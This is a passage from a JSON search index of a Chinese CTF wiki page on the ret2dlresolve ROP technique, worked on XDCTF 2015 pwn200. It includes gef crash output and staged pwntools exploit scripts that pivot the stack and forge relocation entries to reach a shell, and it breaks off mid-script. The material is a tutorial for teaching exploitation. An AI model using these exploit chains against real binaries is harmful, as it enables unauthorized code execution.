plt0\u5bf9\u5e94\u7684\u6c47\u7f16\u4ee3\u7801\uff0c\u8fd9\u65f6\uff0c\u6211\u4eec\u5c31\u53ea\u9700\u8981\u4e00\u4e2aindex\u5c31\u8db3\u591f\u4e86\u3002 \u63a7\u5236index\u7684\u5927\u5c0f\uff0c\u4ee5\u4fbf\u4e8e\u6307\u5411\u81ea\u5df1\u6240\u63a7\u5236\u7684\u533a\u57df\uff0c\u4ece\u800c\u4f2a\u9020\u4e00\u4e2a\u6307\u5b9a\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u3002 \u4f2a\u9020\u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u4f7f\u5f97\u91cd\u5b9a\u4f4d\u8868\u9879\u6240\u6307\u7684\u7b26\u53f7\u4e5f\u5728\u81ea\u5df1\u53ef\u4ee5\u63a7\u5236\u7684\u8303\u56f4\u5185\u3002 \u4f2a\u9020\u7b26\u53f7\u5185\u5bb9\uff0c\u4f7f\u5f97\u7b26\u53f7\u5bf9\u5e94\u7684\u540d\u79f0\u4e5f\u5728\u81ea\u5df1\u53ef\u4ee5\u63a7\u5236\u7684\u8303\u56f4\u5185\u3002 \u6b64\u5916\uff0c\u8fd9\u4e2a\u653b\u51fb\u6210\u529f\u7684\u5f88\u5fc5\u8981\u7684\u6761\u4ef6 dl_resolve\u51fd\u6570\u4e0d\u4f1a\u68c0\u67e5\u5bf9\u5e94\u7684\u7b26\u53f7\u662f\u5426\u8d8a\u754c\uff0c\u5b83\u53ea\u4f1a\u6839\u636e\u6211\u4eec\u6240\u7ed9\u5b9a\u7684\u6570\u636e\u6765\u6267\u884c\u3002 dl_resolve\u51fd\u6570\u6700\u540e\u7684\u89e3\u6790\u6839\u672c\u4e0a\u4f9d\u8d56\u4e8e\u6240\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\u3002 \u6ce8\u610f\uff1a \u7b26\u53f7\u7248\u672c\u4fe1\u606f \u6700\u597d\u4f7f\u5f97ndx = VERSYM[ (reloc->r_info) >> 8] \u7684\u503c\u4e3a0\uff0c\u4ee5\u4fbf\u4e8e\u9632\u6b62\u627e\u4e0d\u5230\u7684\u60c5\u51b5\u3002 \u91cd\u5b9a\u4f4d\u8868\u9879 r_offset\u5fc5\u987b\u662f\u53ef\u5199\u7684\uff0c\u56e0\u4e3a\u5f53\u89e3\u6790\u5b8c\u51fd\u6570\u540e\uff0c\u5fc5\u987b\u628a\u76f8\u5e94\u51fd\u6570\u7684\u5730\u5740\u586b\u5165\u5230\u5bf9\u5e94\u7684\u5730\u5740\u3002","title":"\u539f\u7406"},{"location":"pwn/stackoverflow/advanced_rop/#_2","text":"\u8bf4\u4e86\u8fd9\u4e48\u591a\uff0c\u8fd9\u4e2a\u5229\u7528\u6280\u5de7\u5176\u5b9e\u8fd8\u662fROP\uff0c\u540c\u6837\u53ef\u4ee5\u7ed5\u8fc7NX\u548cASLR\u4fdd\u62a4\u3002\u4f46\u662f\uff0c\u8fd9\u4e2a\u653b\u51fb\u66f4\u9002\u4e8e\u4e00\u4e9b\u6bd4\u8f83\u7b80\u5355\u7684\u6808\u6ea2\u51fa\u7684\u60c5\u51b5\uff0c\u4f46\u540c\u65f6\u53c8\u96be\u4ee5\u6cc4\u9732\u83b7\u53d6\u66f4\u591a\u4fe1\u606f\u7684\u60c5\u51b5\u4e0b\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"pwn/stackoverflow/advanced_rop/#_3","text":"\u8fd9\u91cc\u4ee5XDCTF 2015\u7684pwn200\u4e3a\u4f8b\u3002\u4e3b\u8981\u53c2\u8003 http://pwn4.fun/2016/11/09/Return-to-dl-resolve/ \uff0c\u6df1\u5165\u6d45\u51fa\u3002 https://www.math1as.com/index.php/archives/341/ \u9996\u5148\u6211\u4eec\u53ef\u4ee5\u7f16\u8bd1\u4e0bret2dlresolve\u6587\u4ef6\u5939\u4e0b\u7684\u6e90\u6587\u4ef6main.c\u6587\u4ef6\u5f97\u5230\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u8fd9\u91cc\u53d6\u6d88\u4e86Canary\u4fdd\u62a4\u3002 \u279c ret2dlresolve git: ( master ) \u2717 gcc main.c -m32 -fno-stack-protector -o main \u5728\u4e0b\u9762\u7684\u8bb2\u89e3\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4f1a\u6309\u7167\u4ee5\u4e24\u79cd\u4e0d\u540c\u7684\u65b9\u6cd5\u6765\u8fdb\u884c\u8bb2\u89e3\u3002\u5176\u4e2d\u7b2c\u4e00\u79cd\u65b9\u6cd5\u6bd4\u8f83\u9ebb\u70e6\uff0c\u4f46\u662f\u53ef\u4ee5\u4ed4\u7ec6\u7406\u89e3ret2dlresolve\u7684\u539f\u7406\uff0c\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u5219\u662f\u76f4\u63a5\u4f7f\u7528\u5df2\u6709\u7684\u5de5\u5177\uff0c\u76f8\u5bf9\u5bb9\u6613\u4e00\u70b9\u3002 \u5229\u7528\u6b63\u5e38\u7684\u4ee3\u7801\u6765\u4f7f\u7528\u8be5\u6280\u5de7\u4ece\u800c\u83b7\u53d6shell\u3002 stage 1 \u6d4b\u8bd5\u63a7\u5236\u7a0b\u5e8f\u6267\u884cwrite\u51fd\u6570\u7684\u6548\u679c\u3002 stage 2 \u6d4b\u8bd5\u63a7\u5236\u7a0b\u5e8f\u6267\u884cdl_resolve\u51fd\u6570\uff0c\u5e76\u4e14\u76f8\u5e94\u53c2\u6570\u6307\u5411\u6b63\u5e38write\u51fd\u6570\u7684plt\u65f6\u7684\u6267\u884c\u6548\u679c\u3002 stage 3 \u6d4b\u8bd5\u63a7\u5236\u7a0b\u5e8f\u6267\u884cdl_resolve\u51fd\u6570\uff0c\u5e76\u4e14\u76f8\u5e94\u53c2\u6570\u6307\u5411\u4f2a\u9020\u7684write\u51fd\u6570\u7684plt\u65f6\u7684\u6267\u884c\u6548\u679c\u3002 \u5229\u7528roputils\u4e2d\u5df2\u7ecf\u96c6\u6210\u597d\u7684\u5de5\u5177\u6765\u5b9e\u73b0\u653b\u51fb\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002","title":"\u793a\u4f8b"},{"location":"pwn/stackoverflow/advanced_rop/#_4","text":"\u663e\u7136\u6211\u4eec\u7a0b\u5e8f\u6709\u4e00\u4e2a\u5f88\u660e\u663e\u7684\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684\u3002\u8fd9\u9898\u6211\u4eec\u4e0d\u8003\u8651\u6211\u4eec\u6709libc\u7684\u60c5\u51b5\u3002\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u5206\u6790\u51fa\u504f\u79fb\u4e3a112\u3002 gef \u27a4 pattern create 200 [+] Generating a pattern of 200 bytes aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab [+] Saved as ' $_gef0 ' gef \u27a4 r Starting program : / mnt / hgfs / Hack / ctf / ctf-wiki / pwn / stackoverflow / example / ret2dlresolve / main Welcome to XDCTF2015 ~ ! aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab Program received signal SIGSEGV , Segmentation fault. 0 x62616164 in ?? () \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ registers ] \u2500\u2500\u2500\u2500 $eax : 0x000000c9 $ebx : 0x00000000 $ecx : 0xffffcc6c \u2192 \" aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama [...] \" $edx : 0x00000100 $esp : 0xffffcce0 \u2192 \" eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa [...] \" $ebp : 0x62616163 ( \" caab \"? ) $esi : 0xf7fac000 \u2192 0x001b1db0 $edi : 0xffffcd50 \u2192 0xffffcd70 \u2192 0x00000001 $eip : 0x62616164 ( \" daab \"? ) $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $es : 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [ carry PARITY adjust zero SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code: i386 ] \u2500\u2500\u2500\u2500 [!] Cannot disassemble from $PC \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ] \u2500\u2500\u2500\u2500 ['0 xffffcce0 ' , ' l8 ' ] 8 0 xffffcce0 \u2502+ 0x00 : \" eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa [...] \" \u2190 $esp 0 xffffcce4 \u2502+ 0x04 : \" faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra [...] \" 0 xffffcce8 \u2502+ 0x08 : \" gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa [...] \" 0 xffffccec \u2502+ 0x0c : \" haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta [...] \" 0 xffffccf0 \u2502+ 0x10 : \" iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua [...] \" 0 xffffccf4 \u2502+ 0x14 : \" jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva [...] \" 0 xffffccf8 \u2502+ 0x18 : \" kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa [...] \" 0 xffffccfc \u2502+ 0x1c : \" laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa [...] \" \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ] \u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef \u27a4 pattern search [!] Syntax pattern search PATTERN [ SIZE ] gef \u27a4 pattern search 0x62616164 [+] Searching ' 0x62616164 ' [+] Found at offset 112 ( little-endian search ) likely","title":"\u6b63\u5e38\u653b\u51fb"},{"location":"pwn/stackoverflow/advanced_rop/#stage-1","text":"\u8fd9\u91cc\u6211\u4eec\u7684\u4e3b\u8981\u76ee\u7684\u662f\u63a7\u5236\u7a0b\u5e8f\u6267\u884cwrite\u51fd\u6570\uff0c\u867d\u7136\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u76f4\u63a5\u6267\u884cwrite\u51fd\u6570\u3002\u4f46\u662f\u8fd9\u91cc\u6211\u4eec\u91c7\u7528\u4e00\u4e2a\u66f4\u52a0\u590d\u6742\u7684\u529e\u6cd5\uff0c\u5373\u4f7f\u7528\u6808\u8fc1\u79fb\u7684\u6280\u5de7\uff0c\u5c06\u6808\u8fc1\u79fb\u5230bss\u6bb5\u6765\u63a7\u5236write\u51fd\u6570\u3002\u5373\u4e3b\u8981\u5206\u4e3a\u4e24\u6b65 \u5c06\u6808\u8fc1\u79fb\u5230bss\u6bb5\u3002 \u63a7\u5236write\u51fd\u6570\u8f93\u51fa\u76f8\u5e94\u5b57\u7b26\u4e32\u3002 \u8fd9\u91cc\u4e3b\u8981\u4f7f\u7528\u4e86pwntools\u4e2d\u7684ROP\u6a21\u5757\u3002\u5177\u4f53\u4ee3\u7801\u5982\u4e0b from pwn import * elf = ELF ( 'main' ) r = process ( './main' ) rop = ROP ( './main' ) offset = 112 bss_addr = elf . bss () r . recvuntil ( 'Welcome to XDCTF2015~! \\n ' ) ## stack pivoting to bss segment ## new stack size is 0x800 stack_size = 0x800 base_stage = bss_addr + stack_size ### padding rop . raw ( 'a' * offset ) ### read 100 byte to base_stage rop . read ( 0 , base_stage , 100 ) ### stack pivoting, set esp = base_stage rop . migrate ( base_stage ) r . sendline ( rop . chain ()) ## write cmd=\"/bin/sh\" rop = ROP ( './main' ) sh = \"/bin/sh\" rop . write ( 1 , base_stage + 80 , len ( sh )) rop . raw ( 'a' * ( 80 - len ( rop . chain ()))) rop . raw ( sh ) rop . raw ( 'a' * ( 100 - len ( rop . chain ()))) r . sendline ( rop . chain ()) r . interactive () \u7ed3\u679c\u5982\u4e0b \u279c ret2dlresolve git: ( master ) \u2717 python stage1.py [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) [ + ] Starting local process './main' : pid 120912 [ * ] Loaded cached gadgets for './main' [ * ] Switching to interactive mode /bin/sh [ * ] Got EOF while reading in interactive","title":"stage 1"},{"location":"pwn/stackoverflow/advanced_rop/#stage-2","text":"\u5728\u8fd9\u4e00\u9636\u6bb5\uff0c\u6211\u4eec\u5c06\u4f1a\u5229\u7528dlresolve\u76f8\u5173\u7684\u77e5\u8bc6\u6765\u63a7\u5236\u7a0b\u5e8f\u6267\u884cwrite\u51fd\u6570\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u662f\u5229\u7528plt[0]\u4e2d\u7684\u76f8\u5173\u6307\u4ee4\uff0c\u5373push linkmap\u4ee5\u53ca\u8df3\u8f6c\u5230dl_resolve\u51fd\u6570\u4e2d\u89e3\u6790\u7684\u6307\u4ee4\u3002\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u5f97\u5355\u72ec\u63d0\u4f9b\u4e00\u4e2awrite\u91cd\u5b9a\u4f4d\u9879\u5728plt\u8868\u4e2d\u7684\u504f\u79fb\u3002 from pwn import * elf = ELF ( 'main' ) r = process ( './main' ) rop = ROP ( './main' ) offset = 112 bss_addr = elf . bss () r . recvuntil ( 'Welcome to XDCTF2015~! \\n ' ) ## stack pivoting to bss segment ## new stack size is 0x800 stack_size = 0x800 base_stage = bss_addr + stack_size ### padding rop . raw ( 'a' * offset ) ### read 100 byte to base_stage rop . read ( 0 , base_stage , 100 ) ### stack pivoting, set esp = base_stage rop . migrate ( base_stage ) r . sendline ( rop . chain ()) ## write cmd=\"/bin/sh\" rop = ROP ( './main' ) sh = \"/bin/sh\" plt0 = elf . get_section_by_name ( '.plt' ) . header . sh_addr write_index = ( elf . plt [ 'write' ] - plt0 ) / 16 - 1 write_index *= 8 rop . raw ( plt0 ) rop . raw ( write_index ) ## fake ret addr of write rop . raw ( 'bbbb' ) rop . raw ( 1 ) rop . raw ( base_stage + 80 ) rop . raw ( len ( sh )) rop . raw ( 'a' * ( 80 - len ( rop . chain ()))) rop . raw ( sh ) rop . raw ( 'a' * ( 100 - len ( rop . chain ()))) r . sendline ( rop . chain ()) r . interactive () \u6548\u679c\u5982\u4e0b\uff0c\u4ecd\u7136\u8f93\u51fa\u4e86cmd\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u3002 \u279c ret2dlresolve git: ( master ) \u2717 python stage2.py [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) [ + ] Starting local process './main' : pid 123406 [ * ] Loaded cached gadgets for './main' [ * ] Switching to interactive mode /bin/sh [ * ] Got EOF while reading in interactive","title":"stage 2"},{"location":"pwn/stackoverflow/advanced_rop/#stage-3","text":"\u8fd9\u4e00\u6b21\uff0c\u6211\u4eec\u540c\u6837\u63a7\u5236dl_resolve\u51fd\u6570\u4e2d\u7684index_offset\u53c2\u6570\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u63a7\u5236\u5176\u6307\u5411\u6211\u4eec\u4f2a\u9020\u7684write\u91cd\u5b9a\u4f4d\u9879\u3002 \u9274\u4e8epwntools\u672c\u8eab\u5e76\u4e0d\u652f\u6301\u5bf9\u91cd\u5b9a\u4f4d\u8868\u9879\u7684\u4fe1\u606f\u7684\u83b7\u53d6\u3002\u8fd9\u91cc\u6211\u4eec\u624b\u52a8\u770b\u4e00\u4e0b \u279c ret2dlresolve git: ( master ) \u2717 readelf -r main \u91cd\u5b9a\u4f4d\u8282 '.rel.dyn' \u4f4d\u4e8e\u504f\u79fb\u91cf 0x318 \u542b\u6709 3 \u4e2a\u6761\u76ee\uff1a \u504f\u79fb\u91cf \u4fe1\u606f \u7c7b\u578b \u7b26\u53f7\u503c \u7b26\u53f7\u540d\u79f0 08049ffc 00000306 R_386_GLOB_DAT 00000000 __gmon_start__ 0804a040 00000905 R_386_COPY 0804a040 stdin@GLIBC_2.0 0804a044 00000705 R_386_COPY 0804a044 stdout@GLIBC_2.0 \u91cd\u5b9a\u4f4d\u8282 '.rel.plt' \u4f4d\u4e8e\u504f\u79fb\u91cf 0x330 \u542b\u6709 5 \u4e2a\u6761\u76ee\uff1a \u504f\u79fb\u91cf \u4fe1\u606f \u7c7b\u578b \u7b26\u53f7\u503c \u7b26\u53f7\u540d\u79f0 0804a00c 00000107 R_386_JUMP_SLOT 00000000 setbuf@GLIBC_2.0 0804a010 00000207 R_386_JUMP_SLOT 00000000 read@GLIBC_2.0 0804a014 00000407 R_386_JUMP_SLOT 00000000 strlen@GLIBC_2.0 0804a018 00000507 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0 0804a01c 00000607 R_386_JUMP_SLOT 00000000 write@GLIBC_2.0 \u53ef\u4ee5\u770b\u51fawrite\u7684\u91cd\u5b9a\u8868\u9879\u7684r_offset=0x0804a01c\uff0cr_info=0x00000607\u3002\u5177\u4f53\u4ee3\u7801\u5982\u4e0b from pwn import * elf = ELF ( 'main' ) r = process ( './main' ) rop = ROP ( './main' ) offset = 112 bss_addr = elf . bss () r . recvuntil ( 'Welcome to XDCTF2015~! \\n ' ) ## stack pivoting to bss segment ## new stack size is 0x800 stack_size = 0x800 base_stage = bss_addr + stack_size ### padding rop . raw ( 'a' * offset ) ### read 100 byte to base_stage rop . read ( 0 , base_stage , 100 ) ### stack pivoting, set esp = base_stage rop . migrate ( base_stage ) r . sendline ( rop . chain ()) ## write sh=\"/bin/sh\" rop = ROP ( './main' ) sh = \"/bin/sh\" plt0 = elf . get_section_by_name ( '.plt' ) . header . sh_addr rel_plt = elf . get_section_by_name ( '.rel.plt' ) . header . sh_addr ## making base_stage+24 ---> fake reloc index_offset = base_stage + 24 - rel_plt write_got = elf . got [ 'write' ] r_info = 0x607 rop . raw ( plt0 ) rop . raw ( index_offset ) ## fake ret addr of write rop . raw ( 'bbbb' ) rop . raw ( 1 ) rop . raw ( base_stage + 80 ) rop . raw ( len ( sh )) rop . raw ( write_got ) # fake reloc rop . raw ( r_info ) rop . raw ( 'a' * ( 80 - len ( rop . chain ()))) rop . raw ( sh ) rop . raw ( 'a' * ( 100 - len ( rop . chain ()))) r . sendline ( rop . chain ()) r . interactive () \u6700\u540e\u7ed3\u679c\u5982\u4e0b\uff0c\u8fd9\u6b21\u6211\u4eec\u5728bss\u6bb5\u4f2a\u9020\u4e86\u4e00\u4e2a\u5047\u7684write\u7684\u91cd\u5b9a\u4f4d\u9879\uff0c\u4ecd\u7136\u8f93\u51fa\u4e86\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u3002 \u279c ret2dlresolve git: ( master ) \u2717 python stage3.py [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) [ + ] Starting local process './main' : pid 126063 [ * ] Loaded cached gadgets for './main' [ * ] Switching to interactive mode /bin/sh [ * ] Got EOF while reading in interactive","title":"stage 3"},{"location":"pwn/stackoverflow/advanced_rop/#stage-4","text":"stage3\u4e2d\uff0c\u6211\u4eec\u63a7\u5236\u4e86\u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u4f46\u662f\u91cd\u5b9a\u4f4d\u8868\u9879\u7684\u5185\u5bb9\u4e0ewrite\u539f\u6765\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u4e00\u81f4\uff0c\u8fd9\u6b21\uff0c\u6211\u4eec\u5c06\u6784\u9020\u5c5e\u4e8e\u6211\u4eec\u81ea\u5df1\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u5e76\u4e14\u4f2a\u9020\u8be5\u8868\u9879\u5bf9\u5e94\u7684\u7b26\u53f7\u3002\u9996\u5148\uff0c\u6211\u4eec\u6839\u636ewrite\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u7684r_info=0x607\u53ef\u4ee5\u77e5\u9053\uff0cwrite\u5bf9\u5e94\u7684\u7b26\u53f7\u5728\u7b26\u53f7\u8868\u7684\u4e0b\u6807\u4e3a0x607>>8=0x6\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u77e5\u9053write\u5bf9\u5e94\u7684\u7b26\u53f7\u5730\u5740\u4e3a0x8048238\u3002 \u279c ret2dlresolve git: ( master ) \u2717 objdump -s -EL -j .dynsym main main\uff1a \u6587\u4ef6\u683c\u5f0f elf32-i386 Contents of section .dynsym: 80481d8 00000000 00000000 00000000 00000000 ................ 80481e8 33000000 00000000 00000000 12000000 3 ............... 80481f8 27000000 00000000 00000000 12000000 ' ............... 8048208 52000000 00000000 00000000 20000000 R........... ... 8048218 20000000 00000000 00000000 12000000 ............... 8048228 3a000000 00000000 00000000 12000000 :............... 8048238 4c000000 00000000 00000000 12000000 L............... 8048248 2c000000 44a00408 04000000 11001a00 ,...D........... 8048258 0b000000 3c860408 04000000 11001000 ....<........... 8048268 1a000000 40a00408 04000000 11001a00 ....@........... \u8fd9\u91cc\u7ed9\u51fa\u7684\u5176\u5b9e\u662f\u5c0f\u7aef\u6a21\u5f0f\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u624b\u5de5\u8f6c\u6362\u3002\u6b64\u5916\uff0c\u6bcf\u4e2a\u7b26\u53f7\u5360\u7528\u7684\u5927\u5c0f\u4e3a16\u4e2a\u5b57\u8282\u3002 from pwn import * elf = ELF ( 'main' ) r = process ( './main' ) rop = ROP ( './main' ) offset = 112 bss_addr = elf . bss () r . recvuntil ( 'Welcome to XDCTF2015~! \\n ' ) ## stack pivoting to bss segment ## new stack size is 0x800 stack_size = 0x800 base_stage = bss_addr + stack_size ### padding rop . raw ( 'a' * offset ) 